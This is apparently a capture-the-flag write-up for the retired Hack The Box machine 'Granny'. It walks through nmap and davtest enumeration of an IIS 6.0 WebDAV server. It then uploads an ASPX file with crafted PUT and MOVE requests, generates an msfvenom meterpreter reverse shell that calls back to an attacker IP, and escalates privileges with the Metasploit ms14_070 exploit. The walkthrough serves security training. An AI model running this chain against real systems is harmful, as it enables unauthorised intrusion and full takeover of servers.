# Granny

This is the write-up for the box Granny that got retired at the 21st October 2017.
My IP address was 10.10.14.21 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.15    granny.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/granny.nmap 10.10.10.15
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Sun, 19 Jan 2020 16:45:28 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

The web page displays an _"Under Construction"_ error and nothing interesting in the HTML source code.

As the **WebDAV** scan of Nmap shows, it seems to be possible to use different HTTP methods.
Lets scan what we can do with with the methods:
```markdown
davtest -url http://10.10.10.15

# Output
Sending test files
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.pl
PUT     cgi     FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.html
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.php
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.jhtml
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.cfm
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.jsp
```

Setting up a proxy with **Burpsuite** and looking at the what this scan does:
```markdown
PUT /DavTestDir_xnG2iD5Fuf4lok/davtest_xnG2iD5Fuf4lok.html HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 26

HTML put via davtest<br />
```

So it is possible to upload some text files on the server with the _PUT_ method.
As those will not execute any code, we look at the other methods and see, that we can use the _MOVE_ or _COPY_ method to change the file name to something that ends with _.aspx_ and get command execution.
The response of the box _X-Powered-By: ASP.NET_ suggests that executing an ASPX file should work.

Lets create an ASPX meterpreter shell with **Msfvenom**:
```markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=9001 -f aspx
```

The will create the code that we need to put into an HTML file:
```markdown
PUT /shell.html HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 2860

(Msfvenom Payload)
```

With the _MOVE_ or _COPY_ method, we can change the file name of the HTML file to _shell.aspx_:
```markdown
MOVE /shell.html HTTP/1.1
Destination: /shell.aspx
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 2860
```

Creating the listener in **Metasploit**:
```markdown
msfconsole

use exploit/multi/handler
set LHOST 10.10.14.21
set LPORT 9001
set payload windows/meterpreter/reverse_tcp
exploit -j
```

Now we can browse to _/shell.aspx_ and a **Meterpreter** session will start.

## Privilege Escalation

With the `getuid` command in Meterpreter we see that we are the user _NT AUTHORITY\NETWORK SERVICE_ and need to escalate the privileges.
Lets use the exploit suggester in Metasploit:
```markdown
use post/multi/recon/local_exploit_suggester
set session 1
run
```

It suggests several exploits from which I will use _exploit/windows/local/ms14_070_tcpip_ioctl_:
```markdown
use exploit/windows/local/ms14_070_tcpip_ioctl
set session 1
exploit
```

After running this exploit, a new Meterpreter session as _NT AUTHORITY\SYSTEM_ starts and the box is done!
